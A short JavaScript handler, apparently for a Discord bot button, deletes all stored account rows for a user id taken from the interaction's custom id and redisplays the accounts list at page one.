const { queryParams } = require("../../../db/database");
const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");

module.exports = {
    name: "deleteaccounts",
    callback: async (client, interaction) => {
        let [t, id, current] = interaction.customId.split("|");
        current = parseInt(current);

        // Delete all accounts for the user
        await queryParams(`DELETE FROM accountsbyuser WHERE user_id=?`, [id]);

        // Reset current to 1 since all accounts are deleted
        current = 1;

        // Return to the accounts message with the updated current page
        return interaction.update(await accountsmsg(id, current));
    }
};